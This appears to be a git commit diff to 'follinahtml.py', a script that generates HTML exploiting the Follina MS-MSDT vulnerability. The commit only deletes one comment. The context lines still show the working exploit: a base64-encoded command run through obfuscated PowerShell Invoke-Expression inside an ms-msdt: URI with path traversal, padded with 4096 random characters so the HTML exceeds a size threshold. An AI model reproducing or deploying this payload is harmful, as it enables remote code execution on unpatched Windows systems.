057f8f8c27a699c207c771f804ccdd3aba37da98
eh050 <85235038+eh050@users.noreply.github.com>
2026-08-27 16:22:12 -0400

    Update follinahtml.py

--- follinahtml.py
+++ follinahtml.py
@@ -12,7 +12,6 @@ else:
 
 base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
 
-# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
 html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
 html_payload += (
     "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
